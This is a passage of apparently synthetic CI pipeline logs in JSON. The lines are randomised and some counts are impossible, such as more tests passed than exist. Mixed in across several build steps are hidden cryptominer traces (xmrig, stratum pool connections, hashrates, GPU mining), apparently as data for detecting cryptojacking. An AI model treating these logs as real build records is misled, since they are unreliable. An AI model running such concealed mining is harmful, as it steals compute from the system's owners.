          "xmrig: Starting mining on pool.cloud.services:3333",
          "OK",
          "[12:20:15] DEBUG: Connection pool: 20 active",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Exception: ValueError",
          "Coverage: 76% statements, 65% branches",
          "Checking out develop branch",
          "Ran 154 tests in 41s",
          "Minifying vendor.js",
          "Optimizing 87 modules...",
          "Compiling lib/handler.rs...",
          "Step 2/25: Building",
          "Optimizing 22 modules...",
          "pip: Downloading axios-3.17.tar.gz",
          "POST /api - 200 (62ms)",
          "Finished.",
          "Compiling utils/utils.go...",
          "Minifying app.js",
          "Connection established",
          "Using Node.js 14.9.5",
          "Waiting...",
          "Snapshots: 34 passed, 45 total",
          "[12:20:15] DEBUG: Memory usage: 1088MB",
          "Cache invalidated: build",
          "Cache restored successfully (97MB)",
          "\u2713 All checks passed",
          "npm notice: package.json updated",
          "Creating production build...",
          "Step 8/16: Linting",
          "Exception: NullPointerException",
          "Layer 7/15: ENV command",
          "Fetching submodules...",
          "Compiling utils/index.js...",
          "Image pulled successfully",
          "Exception: TypeError",
          "Test Suites: 14 passed, 28 total",
          "WARNING: webpack has known vulnerabilities",
          "Cache saved successfully",
          "[12:20:15] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "npm notice: package.json updated",
          "pip: Installing build dependencies...",
          "Tests: 195 passed, 225 total",
          "\u2713 test completed",
          "[12:20:15] DEBUG: Connection pool: 20 active",
          "\u2713 Step 'setup' succeeded",
          "Using Python 3.12",
          "cryptonight: Hashrate: 8771 H/s",
          "Compiling utils/handler.rs...",
          "[12:20:15] INFO: Processing request",
          "pip: Downloading webpack-4.1.tar.gz",
          "Optimizing 23 modules...",
          "minerd: 13 threads active",
          "\u2713 Step 'build' succeeded",
          "Cache invalidated: dependencies",
          "Ran 164 tests in 39s",
          "Test Suites: 24 passed, 23 total",
          "[12:20:15] WARN: Deprecated API usage",
          "minerd: 15 threads active",
          "Connection established",
          "POST /api - 202 (67ms)",
          "Platform: win32-x64",
          "Environment: test",
          "Connecting to startup.dev:443...",
          "\u2713 Task completed in 4705ms",
          "Cache restored successfully (494MB)",
          "NODE_ENV=production",
          "WARNING: axios has known vulnerabilities",
          "[12:20:15] INFO: Cache refreshed",
          "Using Node.js 16.11.10",
          "[12:20:15] INFO: Processing request",
          "Minifying main.js",
          "Cache miss for key-7074",
          "Completed.",
          "npm install: added 241 packages",
          "Processing...",
          "Installing lodash@2.13.10",
          "Using Node.js 16.18.0",
          "Transforming 983 files...",
          "Step 1/21: Building",
          "Compiling src/app.ts...",
          "\u2717 build failed with exit code 119",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-10T12:23:35.715901",
        "finished_at": "2025-12-10T12:25:06.764879",
        "log_lines": [
          "Connecting to stratum+tcp://mine.cloud.services:3333",
          "=== Step: integration_tests ===",
          "Checking out develop branch",
          "Step 5/15: Deploying",
          "Pushing to registry...",
          "pip install: Successfully installed express-3.3",
          "Creating production build...",
          "Installing react@1.4.8",
          "Fetching submodules...",
          "\u2713 package completed",
          "Success!",
          "Cache miss for key-7801",
          "POST /upload - 201 (43ms)",
          "npm install: added 321 packages",
          "Uploading artifact 'coverage' (7 files)",
          "Step 3/22: Running migrations",
          "yarn add: Done in 15.22s",
          "Building Docker image...",
          "Connecting to acme.corp:443...",
          "[12:20:15] WARN: Deprecated API usage",
          "Completed.",
          "Verifying...",
          "Cache saved successfully",
          "xmrig: Starting mining on pool.acme.corp:3333",
          "[12:20:15] INFO: Connecting to database",
          "[12:20:15] DEBUG: Initializing service",
          "npm notice: created a lockfile",
          "minerd: 16 threads active",
          "Time: 42.809s",
          "Snapshots: 6 passed, 11 total",
          "Exception: NullPointerException",
          "Creating production build...",
          "WARNING: express has known vulnerabilities",
          "Pushing to registry...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 13/15: Installing dependencies",
          "Cache invalidated: dependencies",
          "Step 11/17: Installing dependencies",
          "Switched to branch 'hotfix/task-991'",
          "GET /api - 200 (13ms)",
          "[12:20:15] INFO: Request completed",
          "Optimizing 15 modules...",
          "[12:20:15] WARN: Deprecated API usage",
          "Processing...",
          "WARNING: eslint has known vulnerabilities",
          "npm install: added 65 packages",
          "Environment: production",
          "npm notice: created a lockfile",
          "TLS handshake completed",
          "Loading...",
          "Cache hit for key-8267",
          "Cache restored successfully (259MB)",
          "Done.",
          "[12:20:15] INFO: Request completed",
          "Cache miss for key-9300",
          "Ready.",
          "Already up to date.",
          "\u2713 Task completed in 462ms",
          "Cache invalidated: dependencies",
          "GPU #1: 83\u00b0C, mining",
          "Connecting to stratum+tcp://mine.startup.dev:3333",
          "Done.",
          "Compiling utils/index.js...",
          "Snapshots: 18 passed, 3 total",
          "\u2713 All checks passed",
          "WARNING: jest has known vulnerabilities",
          "WARNING: lodash has known vulnerabilities",
          "Building Docker image...",
          "[12:20:15] INFO: Cache refreshed",
          "\u2713 Step 'checkout' succeeded",
          "Artifact downloaded: 22MB",
          "npm install: resolved 1320 packages",
          "Creating production build...",
          "Creating production build...",
          "[12:20:15] DEBUG: Loading configuration",
          "yarn add: Done in 26.41s",
          "\u2713 test completed",
          "[12:20:15] DEBUG: Memory usage: 452MB",
          "Cache hit for key-8439",
          "Compiling utils/app.ts...",
          "Already up to date.",
          "Checking out master branch",
          "Coverage: 100% statements, 90% branches",
          "  PASS: unit/test_cache_hit.spec.js",
          "[12:20:15] INFO: Cache refreshed",
          "npm notice: package.json updated",
          "Bundling main.js",
          "Step 4/22: Installing dependencies",
          "Ready.",
          "[12:20:15] DEBUG: Query executed in 70ms",
          "Compiling lib/index.js...",
          "Pushing to registry...",
          "Transforming 859 files...",
          "Already up to date.",
          "Cache hit for key-7662",
          "Cache saved successfully",
          "[12:20:15] DEBUG: Loading configuration",
          "Environment: test",
          "cryptonight: Hashrate: 9840 H/s",
          "Compiling utils/index.js...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Processing...",
          "Creating production build...",
          "Connecting to stratum+tcp://mine.example.com:3333",
          "[12:20:15] INFO: Connecting to database",
          "WARNING: react has known vulnerabilities",
          "GPU #2: 79\u00b0C, mining",
          "Generating source maps...",
          "Artifact downloaded: 11MB",
          "Step 3/24: Testing",
          "[12:20:15] WARN: Deprecated API usage",
          "Step 13/24: Linting",
          "Compiling lib/handler.rs...",
          "Using Node.js 15.16.8",
          "Optimizing 17 modules...",
          "pip install: Successfully installed jest-3.4",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:20:15] INFO: Processing request",
          "npm notice: created a lockfile",
          "NODE_ENV=development",
          "Tests: 66 passed, 471 total",
          "Step 16/24: Deploying",
          "Tests: 121 passed, 75 total",
          "[12:20:15] DEBUG: Connection pool: 10 active",
          "Optimizing 21 modules...",
          "pip install: Successfully installed eslint-2.18",
          "Layer 7/14: COPY command",
          "Success!",
          "Transforming 915 files...",
          "Step 10/21: Linting",
          "Done.",
          "[12:20:15] WARN: Deprecated API usage",
          "Tests: 209 passed, 201 total",
          "Accepted share #622",
          "pip: Collecting react",
          "pip: Installing build dependencies...",
          "WARNING: axios has known vulnerabilities",
          "FAILED: test_cache_hit",
          "Compiling components/index.js...",
          "Cache restored successfully (215MB)",
          "GET /health - 204 (11ms)",
          "Step 14/23: Testing",
          "Checking out develop branch",
          "[12:20:15] INFO: Starting build process",
          "Processing...",
          "pip: Installing build dependencies...",
          "xmrig: Starting mining on pool.example.com:3333",
          "[12:20:15] INFO: Request completed",
          "GPU #3: 78\u00b0C, mining",
          "Minifying vendor.js",
          "Artifact uploaded: build.tar.gz (37MB)",
          "npm notice: package.json updated",
          "NODE_ENV=test",
          "Step 6/22: Running migrations",
          "Artifact uploaded: dist.zip (17MB)",
          "Using Node.js 20.3.0",
          "[12:20:15] WARN: Deprecated API usage",
          "Compiling utils/utils.go...",
          "yarn add: Done in 22.75s",
          "[12:20:15] INFO: Processing request",
          "Connection established",
          "Using Node.js 17.6.8",
          "Using Python 3.9",
          "Image pulled successfully",
          "Step 13/21: Installing dependencies",
          "Loading...",
          "Waiting...",
          "Fetching submodules...",
          "Artifact uploaded: dist.zip (54MB)",
          "pip: Downloading prettier-1.10.tar.gz",
          "Snapshots: 47 passed, 12 total",
          "Generating source maps...",
          "Step 11/22: Deploying",
          "[12:20:15] DEBUG: Connection pool: 12 active",
          "npm install: resolved 1455 packages",
          "  PASS: test_api_health (272ms)",
          "Done.",
          "\u2713 Step 'install' succeeded",
          "minerd: 5 threads active",
          "npm notice: package.json updated",
          "POST /data - 201 (371ms)",
          "Accepted share #905",
          "Completed.",
          "WARNING: express has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "npm notice: created a lockfile",
          "pip install: Successfully installed express-1.11",
          "\u2713 build completed",
          "Transforming 175 files...",
          "Fetching submodules...",
          "pip: Installing build dependencies...",
          "WARNING: react has known vulnerabilities",
          "Uploading artifact 'dist' (19 files)",
          "Layer 5/14: COPY command",
          "Using Python 3.12",
          "[12:20:15] DEBUG: Query executed in 43ms",
          "Snapshots: 3 passed, 42 total",
          "Cache saved successfully",
          "Snapshots: 4 passed, 13 total",
          "Platform: win32-x64",
          "Pushing to registry...",
          "pip: Installing build dependencies...",
          "npm notice: package.json updated",
          "Compiling src/main.py...",
          "pip: Installing build dependencies...",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-10T12:25:06.764879",
        "finished_at": "2025-12-10T12:27:23.338347",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Layer 1/10: COPY command",
          "pip: Installing build dependencies...",
          "Cache invalidated: build",
          "[12:20:15] DEBUG: Initializing service",
          "Building Docker image...",
          "Cache miss for key-2456",
          "Tests: 396 passed, 322 total",
          "[12:20:15] INFO: Processing request",
          "Image pulled successfully",
          "Tests: 390 passed, 329 total",
          "OK",
          "Already up to date.",
          "Finished.",
          "Step 14/18: Building",
          "Exception: RuntimeError",
          "\u2713 test completed",
          "Optimizing 26 modules...",
          "  PASS: test_cache_hit (372ms)",
          "Environment: staging",
          "[12:20:15] INFO: Starting build process",
          "Compiling components/index.js...",
          "Artifact uploaded: dist.zip (16MB)",
          "Step 18/23: Running migrations",
          "Completed.",
          "[12:20:15] DEBUG: Memory usage: 1928MB",
          "Waiting...",
          "yarn add: Done in 19.88s",
          "Success!",
          "Using Node.js 16.12.0",
          "Bundling vendor.css",
          "[12:20:15] WARN: Deprecated API usage",
          "pip: Downloading eslint-2.17.tar.gz",
          "[12:20:15] DEBUG: Connection pool: 3 active",
          "Already up to date.",
          "Waiting...",
          "NODE_ENV=test",
          "[12:20:15] INFO: Cache refreshed",
          "Coverage: 86% statements, 100% branches",
          "Step 16/25: Linting",
          "\u2713 Step 'install' succeeded",
          "[12:20:15] INFO: Starting build process",
          "Minifying vendor.js",
          "Fetching submodules...",
          "Connection established",
          "Tests: 141 passed, 306 total",
          "Pushing to registry...",
          "Step 7/23: Linting",
          "[12:20:15] ERROR: Connection failed",
          "Minifying app.js",
          "Done.",
          "FAILED: test_db_connect",
          "pip: Collecting eslint",
          "FAILED: test_cache_hit",
          "[12:20:15] INFO: Cache refreshed",
          "Generating source maps...",
          "Waiting...",
          "Completed.",
          "Pulling image: node:18",
          "Fetching submodules...",
          "Uploading artifact 'coverage' (43 files)",
          "Cache restored successfully (393MB)",
          "  PASS: integration/test_user_create.spec.js",
          "Artifact uploaded: build.tar.gz (9MB)",
          "\u2713 Task completed in 1493ms",
          "Ran 185 tests in 33s",
          "Step 19/25: Testing",
          "Using Node.js 19.20.4",
          "Artifact uploaded: dist.zip (63MB)",
          "POST /upload - 201 (138ms)",
          "[12:20:15] WARN: Deprecated API usage",
          "Compiling lib/handler.rs...",
          "pip: Downloading jest-1.16.tar.gz",
          "TLS handshake completed",
          "Artifact downloaded: 10MB",
          "[12:20:15] DEBUG: Memory usage: 1123MB",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 All checks passed",
          "Already up to date.",
          "Uploading artifact 'dist' (39 files)",
          "Bundling styles.js",
          "NODE_ENV=test",
          "Image pulled successfully",
          "Compiling utils/index.js...",
          "[12:20:15] ERROR: Connection failed",
          "Fetching submodules...",
          "Cache saved successfully",
          "Snapshots: 30 passed, 47 total",
          "Loading...",
          "Step 5/22: Installing dependencies",
          "npm install: added 451 packages",
          "\u2713 Step 'checkout' succeeded",
          "  PASS: test_db_connect (77ms)",
          "[12:20:15] INFO: Cache refreshed",
          "[12:20:15] WARN: Deprecated API usage",
          "Layer 8/10: ENV command",
          "[12:20:15] WARN: Deprecated API usage",
          "Using Node.js 17.4.5",
          "Building Docker image...",
          "\u2713 Step 'checkout' succeeded",
          "Step 14/23: Linting",
          "Transforming 897 files...",
          "GET /api - 201 (48ms)",
          "Cache invalidated: dependencies",
          "GET /health - 201 (69ms)",
          "Pulling image: alpine:latest",
          "Test Suites: 8 passed, 34 total",
          "[12:20:15] INFO: Processing request",
          "Generating source maps...",
          "Done.",
          "[12:20:15] WARN: Deprecated API usage",
          "Transforming 529 files...",
          "Optimizing 14 modules...",
          "  PASS: test_user_create (423ms)",
          "npm notice: package.json updated",
          "Processing...",
          "Step 6/18: Building",
          "npm install: added 366 packages",
          "Transforming 936 files...",
          "[12:20:15] DEBUG: Memory usage: 771MB",
          "Step 17/17: Linting",
          "\u2713 Task completed in 4755ms",
          "Artifact uploaded: dist.zip (58MB)",
          "Verifying...",
          "npm notice: package.json updated",
          "Step 18/19: Deploying",
          "npm notice: created a lockfile",
          "npm notice: package.json updated",
          "[12:20:15] INFO: Connecting to database",
          "[12:20:15] WARN: Deprecated API usage",
          "[12:20:15] DEBUG: Query executed in 96ms",
          "Step 13/25: Installing dependencies",
          "[12:20:15] INFO: Connecting to database",
          "Cache saved successfully",
          "\u2713 All checks passed",
          "Success!",
          "POST /upload - 202 (273ms)",
          "npm notice: package.json updated",
          "Platform: win32-x64",
          "Building Docker image...",
          "Done.",
          "Image pulled successfully",
          "Success!",
          "npm notice: package.json updated",
          "\u2713 package completed",
          "Connecting to startup.dev:443...",
          "HEAD is now at 6b83106",
          "[12:20:15] DEBUG: Memory usage: 227MB",
          "Step 14/18: Building",
          "\u2713 Step 'test' succeeded",
          "\u2713 Task completed in 2791ms",
          "Layer 6/9: RUN command",
          "npm notice: package.json updated",
          "Cache hit for key-9980",
          "Compiling components/handler.rs...",
          "Platform: linux-x64",
          "TLS handshake completed",
          "[12:20:15] INFO: Starting build process",
          "[12:20:15] INFO: Starting build process",
          "Artifact uploaded: build.tar.gz (7MB)",
          "\u2717 build failed with exit code 28",
          "Building Docker image...",
          "Verifying...",
          "\u2713 build completed",
          "Generating source maps...",
          "GET /status - 204 (3ms)",
          "Ready.",
          "[12:20:15] ERROR: Connection failed",
          "Cache hit for key-4867",
          "yarn add: Done in 26.91s",
          "Cache invalidated: build",
          "[12:20:15] INFO: Starting build process",
          "OK",
          "Compiling lib/handler.rs...",
          "Environment: test",
          "pip: Collecting react",
          "[12:20:15] WARN: Deprecated API usage",
          "Compiling src/utils.go...",
          "Generating source maps...",
          "Ready.",
          "Step 9/20: Building",
          "Transforming 715 files...",
          "Minifying vendor.js",
          "npm notice: package.json updated",
          "[12:20:15] INFO: Request completed",
          "Fetching submodules...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "NODE_ENV=production",
          "Time: 16.927s",
          "Step 17/18: Linting",
          "Artifact uploaded: build.tar.gz (23MB)",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-10T12:27:23.338347",
        "finished_at": "2025-12-10T12:28:08.862836",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Processing...",
          "Pushing to registry...",
          "Test Suites: 50 passed, 45 total",
          "Ready.",
          "Pulling image: python:3.11",
          "NODE_ENV=production",
          "[12:20:15] INFO: Cache refreshed",
          "\u2713 Step 'build' succeeded",
          "Using Node.js 18.8.7",
          "Creating production build...",
          "WARNING: jest has known vulnerabilities",
          "\u2713 All checks passed",
          "[12:20:15] WARN: Deprecated API usage",
          "Image pulled successfully",
          "Step 3/20: Testing",
          "NODE_ENV=test",
          "npm install: resolved 1265 packages",
          "Using Node.js 14.20.2",
          "\u2713 Step 'checkout' succeeded",
          "[12:20:15] DEBUG: Initializing service",
          "[12:20:15] DEBUG: Memory usage: 1035MB",
          "Environment: development",
          "pip install: Successfully installed eslint-2.11",
          "Already up to date.",
          "Step 17/20: Testing",
          "Platform: darwin-arm64",
          "[12:20:15] INFO: Request completed",
          "npm notice: package.json updated",
          "GET /health - 200 (7ms)",
          "Success!",
          "Finished.",
          "Test Suites: 29 passed, 38 total",
          "Finished.",
          "WARNING: axios has known vulnerabilities",
          "Using Node.js 14.9.2",
          "[12:20:15] INFO: Cache refreshed",
          "[12:20:15] INFO: Connecting to database",
          "WARNING: lodash has known vulnerabilities",
          "Step 15/24: Running migrations",
          "pip install: Successfully installed eslint-1.7",
          "[12:20:15] INFO: Starting build process",
          "Creating production build...",
          "Optimizing 51 modules...",
          "Bundling styles.css",
          "Connecting to test.io:443...",
          "pip: Installing build dependencies...",
          "Installing webpack@1.2.7",
          "Using Node.js 14.14.2",
          "pip install: Successfully installed react-3.3",
          "[12:20:15] DEBUG: Query executed in 42ms",
          "Test Suites: 9 passed, 24 total",
          "Checking out master branch",
          "[12:20:15] WARN: Deprecated API usage",
          "Success!",
          "Using Python 3.12",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Finished.",
          "[12:20:15] INFO: Starting build process",
          "Compiling src/main.py...",
          "Platform: darwin-arm64",
          "npm install: added 107 packages",
          "Creating production build...",
          "Done.",
          "Compiling lib/main.py...",
          "[12:20:15] WARN: Deprecated API usage",
          "Step 13/21: Linting",
          "Fetching submodules...",
          "\u2713 package completed",
          "Loading...",
          "  PASS: unit/test_cache_hit.spec.js",
          "NODE_ENV=production",
          "Cache saved successfully",
          "[12:20:15] INFO: Processing request",
          "[12:20:15] INFO: Request completed",
          "Pulling image: python:3.11",
          "Already up to date.",
          "OK",
          "Generating source maps...",
          "Compiling lib/handler.rs...",
          "Waiting...",
          "Step 13/18: Installing dependencies",
          "[12:20:15] INFO: Processing request",
          "[12:20:15] DEBUG: Connection pool: 8 active",
          "Optimizing 86 modules...",
          "Finished.",
          "[12:20:15] ERROR: Connection failed",
          "Platform: darwin-arm64",
          "pip: Installing build dependencies...",
          "[12:20:15] WARN: Deprecated API usage",
          "HEAD is now at 25b7fef",
          "Platform: linux-x64",
          "Compiling utils/handler.rs...",
          "Building Docker image...",
          "Minifying app.js",
          "[12:20:15] DEBUG: Loading configuration",
          "Compiling utils/utils.go...",
          "npm install: resolved 1868 packages",
          "[12:20:15] DEBUG: Memory usage: 478MB",
          "pip: Installing build dependencies...",
          "Cache restored successfully (138MB)",
          "Installing axios@4.6.5",
          "Coverage: 96% statements, 76% branches",
          "Connection established",
          "WARNING: lodash has known vulnerabilities",
          "pip install: Successfully installed prettier-4.17",
          "POST /upload - 202 (31ms)",
          "Checking out develop branch",
          "npm install: resolved 240 packages",
          "Bundling styles.css",
          "Ready.",
          "FAILED: test_auth_login",
          "\u2713 All checks passed",
          "Cache miss for key-8915",
          "NODE_ENV=development",
          "pip: Downloading react-2.6.tar.gz",
          "[12:20:15] INFO: Processing request",
          "Platform: win32-x64",
          "pip: Downloading prettier-1.5.tar.gz",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache invalidated: dependencies",
          "[12:20:15] INFO: Processing request",
          "Completed.",
          "npm notice: created a lockfile",
          "Layer 6/13: RUN command",
          "Step 9/25: Deploying",
          "Checking out main branch",
          "Using Node.js 15.1.1",
          "WARNING: react has known vulnerabilities",
          "[12:20:15] ERROR: Connection failed",
          "\u2713 Step 'install' succeeded",
          "Pulling image: python:3.11",
          "WARNING: express has known vulnerabilities",
          "Pushing to registry...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Building Docker image...",
          "Done.",
          "Snapshots: 34 passed, 35 total",
          "Processing...",
          "\u2713 Task completed in 4292ms",
          "Compiling lib/index.js...",
          "Building Docker image...",
          "[12:20:15] ERROR: Connection failed",
          "Connecting to example.com:443...",
          "Loading...",
          "Checking out master branch",
          "Bundling styles.css",
          "Finished.",
          "Using Python 3.10",
          "pip: Downloading axios-1.15.tar.gz",
          "WARNING: axios has known vulnerabilities",
          "Installing eslint@3.5.1",
          "  PASS: e2e/test_user_create.spec.js",
          "[12:20:15] DEBUG: Query executed in 60ms",
          "Environment: development",
          "Already up to date.",
          "npm notice: created a lockfile",
          "[12:20:15] DEBUG: Query executed in 69ms",
          "Time: 108.619s",
          "Building Docker image...",
          "Completed.",
          "Transforming 570 files...",
          "Artifact downloaded: 27MB",
          "[12:20:15] DEBUG: Memory usage: 574MB",
          "Snapshots: 18 passed, 42 total",
          "Minifying vendor.js",
          "Test Suites: 27 passed, 41 total",
          "Verifying...",
          "Minifying app.js",
          "Loading...",
          "Image pulled successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Pushing to registry...",
          "HEAD is now at 560ac6b",
          "Connecting to example.com:443...",
          "[12:20:15] WARN: Deprecated API usage",
          "\u2713 Task completed in 1102ms",
          "Step 11/23: Running migrations",
          "npm notice: created a lockfile",
          "Compiling src/main.py...",
          "Finished.",
          "GET /status - 200 (91ms)",
          "Minifying main.js",
          "Using Node.js 16.7.2",
          "\u2717 build failed with exit code 60",
          "Image pulled successfully",
          "Already up to date.",
          "[12:20:15] INFO: Connecting to database",
          "[12:20:15] INFO: Cache refreshed",
          "Verifying...",
          "Environment: development",
          "Finished.",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-10T12:28:08.862836",
        "finished_at": "2025-12-10T12:28:54.387325",
        "log_lines": [
          "=== Step: type_check ===",
          "Pulling image: alpine:3.11",
          "Compiling components/service.java...",
          "Artifact uploaded: dist.zip (32MB)",
          "npm notice: created a lockfile",
          "Image pulled successfully",
          "Already up to date.",
          "Layer 10/8: ENV command",
          "Connecting to acme.corp:443...",
          "NODE_ENV=test",
          "Finished.",
          "Switched to branch 'hotfix/task-854'",
          "[12:20:15] DEBUG: Query executed in 60ms",
          "Compiling components/utils.go...",
          "pip install: Successfully installed lodash-1.11",
          "[12:20:15] DEBUG: Loading configuration",
          "Artifact uploaded: dist.zip (70MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Waiting...",
          "WARNING: react has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Pushing to registry...",
          "Generating source maps...",
          "Environment: test",
          "Cache invalidated: dependencies",
          "Completed.",
          "[12:20:15] DEBUG: Initializing service",
          "pip: Downloading axios-2.8.tar.gz",
          "Cache restored successfully (466MB)",
          "Building Docker image...",
          "OK",
          "Step 17/17: Testing",
          "Success!",
          "Step 10/23: Installing dependencies",
          "npm install: added 287 packages",
          "GET /api - 204 (12ms)",
          "Image pulled successfully",
          "npm install: added 119 packages",
          "Test Suites: 36 passed, 37 total",
          "Connection established",
          "[12:20:15] INFO: Processing request",
          "Success!",
          "[12:20:15] DEBUG: Query executed in 38ms",
          "Fetching submodules...",
          "npm notice: created a lockfile",
          "TLS handshake completed",
          "[12:20:15] INFO: Request completed",
          "Building Docker image...",
          "Artifact uploaded: dist.zip (27MB)",
          "Optimizing 74 modules...",
          "[12:20:15] WARN: Deprecated API usage",
          "Using Python 3.12",
          "Environment: staging",
          "[12:20:15] DEBUG: Loading configuration",
          "Verifying...",
          "Transforming 587 files...",
          "Artifact uploaded: dist.zip (51MB)",
          "Image pulled successfully",
          "Connection established",
          "\u2713 All checks passed",
          "[12:20:15] DEBUG: Memory usage: 1869MB",
          "Step 19/23: Installing dependencies",
          "TLS handshake completed",
          "Uploading artifact 'dist' (37 files)",
          "Processing...",
          "[12:20:15] INFO: Starting build process",
          "\u2717 build failed with exit code 103",
          "[12:20:15] ERROR: Connection failed",
          "[12:20:15] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "Environment: development",
          "Step 20/15: Building",
          "Completed.",
          "pip: Collecting prettier",
          "Snapshots: 43 passed, 2 total",
          "Compiling components/main.py...",
          "FAILED: test_db_connect",
          "Test Suites: 36 passed, 40 total",
          "Cache miss for key-7558",
          "[12:20:15] ERROR: Connection failed",
          "Using Node.js 17.6.3",
          "\u2717 build failed with exit code 26",
          "WARNING: lodash has known vulnerabilities",
          "Step 17/18: Testing",
          "npm notice: package.json updated",
          "Step 6/18: Running migrations",
          "[12:20:15] DEBUG: Initializing service",
          "Cache saved successfully",
          "Already up to date.",
          "Step 2/24: Running migrations",
          "Bundling styles.js",
          "Tests: 292 passed, 327 total",
          "Step 8/19: Linting",
          "npm notice: package.json updated",
          "Environment: test",
          "Artifact uploaded: build.tar.gz (21MB)",
          "npm notice: created a lockfile",
          "[12:20:15] DEBUG: Connection pool: 9 active",
          "Generating source maps...",
          "Finished.",
          "pip: Downloading axios-2.14.tar.gz",
          "Step 16/20: Building",
          "Ready.",
          "Already up to date.",
          "Step 1/23: Linting",
          "Transforming 275 files...",
          "Checking out develop branch",
          "Ready.",
          "Step 7/21: Deploying",
          "WARNING: axios has known vulnerabilities",
          "Creating production build...",
          "[12:20:15] INFO: Starting build process",
          "Optimizing 91 modules...",
          "[12:20:15] INFO: Request completed",
          "FAILED: test_api_health",
          "pip install: Successfully installed axios-1.13",
          "Tests: 260 passed, 200 total",
          "Verifying...",
          "Coverage: 83% statements, 98% branches",
          "Coverage: 99% statements, 72% branches",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache restored successfully (387MB)",
          "Step 15/19: Running migrations",
          "  PASS: unit/test_api_health.spec.js",
          "Tests: 379 passed, 127 total",
          "Using Node.js 20.19.1",
          "Step 16/25: Running migrations",
          "OK",
          "yarn add: Done in 5.19s",
          "Success!",
          "Switched to branch 'feature/task-606'",
          "  PASS: test_api_health (474ms)",
          "\u2713 package completed",
          "Step 17/17: Building",
          "Snapshots: 1 passed, 25 total",
          "Uploading artifact 'dist' (40 files)",
          "Cache restored successfully (446MB)",
          "Pushing to registry...",
          "[12:20:15] INFO: Starting build process",
          "Ready.",
          "Artifact uploaded: dist.zip (23MB)",
          "  PASS: unit/test_auth_login.spec.js",
          "pip: Downloading axios-2.3.tar.gz",
          "Waiting...",
          "[12:20:15] INFO: Request completed",
          "Connection established",
          "Bundling vendor.js",
          "\u2713 Task completed in 1872ms",
          "Ran 156 tests in 25s",
          "Connection established",
          "Success!",
          "pip install: Successfully installed jest-3.7",
          "Ran 157 tests in 45s",
          "Uploading artifact 'dist' (27 files)",
          "Step 12/18: Testing",
          "Loading...",
          "pip: Collecting prettier",
          "Using Node.js 16.17.5",
          "Ready.",
          "Building Docker image...",
          "Processing...",
          "OK",
          "Test Suites: 41 passed, 5 total",
          "[12:20:15] WARN: Deprecated API usage",
          "Using Python 3.10",
          "Already up to date.",
          "Pulling image: node:latest",
          "[12:20:15] INFO: Cache refreshed",
          "Loading...",
          "pip install: Successfully installed eslint-4.1",
          "Waiting...",
          "\u2713 All checks passed",
          "Fetching submodules...",
          "Exception: ValueError",
          "[12:20:15] INFO: Request completed",
          "Installing prettier@4.2.6",
          "Ran 113 tests in 56s",
          "Connection established",
          "Success!",
          "[12:20:15] DEBUG: Query executed in 11ms",
          "Loading...",
          "\u2713 Step 'test' succeeded",
          "Cache restored successfully (413MB)",
          "Step 9/25: Linting",
          "Cache saved successfully",
          "TLS handshake completed",
          "Using Node.js 20.14.1",
          "Pulling image: node:3.11",
          "NODE_ENV=development",
          "yarn add: Done in 10.10s",
          "[12:20:15] INFO: Request completed",
          "[12:20:15] DEBUG: Connection pool: 1 active",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-10T12:28:54.387325",
        "finished_at": "2025-12-10T12:29:12.597121",
        "log_lines": [
          "=== Step: deploy_production ===",
          "POST /api - 202 (295ms)",
          "Fetching submodules...",
          "Cache miss for key-9815",
          "Coverage: 78% statements, 98% branches",
          "Step 16/22: Linting",
          "[12:20:15] WARN: Deprecated API usage",
          "Step 5/16: Installing dependencies",
          "Bundling vendor.js",
          "Cache saved successfully",
          "Ran 22 tests in 14s",
          "[12:20:15] DEBUG: Query executed in 2ms",
          "Uploading artifact 'build' (3 files)",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Generating source maps...",
          "Generating source maps...",
          "[12:20:15] INFO: Processing request",
          "Step 16/19: Testing",
          "Artifact uploaded: build.tar.gz (7MB)",
          "npm notice: created a lockfile",
          "WARNING: eslint has known vulnerabilities",
          "Compiling lib/handler.rs...",
          "Image pulled successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Transforming 787 files...",
          "Cache saved successfully",
          "[12:20:15] WARN: Deprecated API usage",
          "Finished.",
          "npm install: added 458 packages",
          "Creating production build...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:20:15] WARN: Deprecated API usage",
          "Waiting...",
          "Waiting...",
          "Artifact downloaded: 26MB",
          "[12:20:15] DEBUG: Query executed in 19ms",
          "[12:20:15] INFO: Cache refreshed",
          "pip: Downloading webpack-2.1.tar.gz",
          "npm notice: created a lockfile",
          "Platform: win32-x64",
          "\u2713 All checks passed",
          "Already up to date.",
          "\u2713 Task completed in 2020ms",
          "Checking out develop branch",
          "Already up to date.",
          "Done.",
          "[12:20:15] INFO: Connecting to database",
          "Step 8/24: Installing dependencies",
          "[12:20:15] INFO: Request completed",
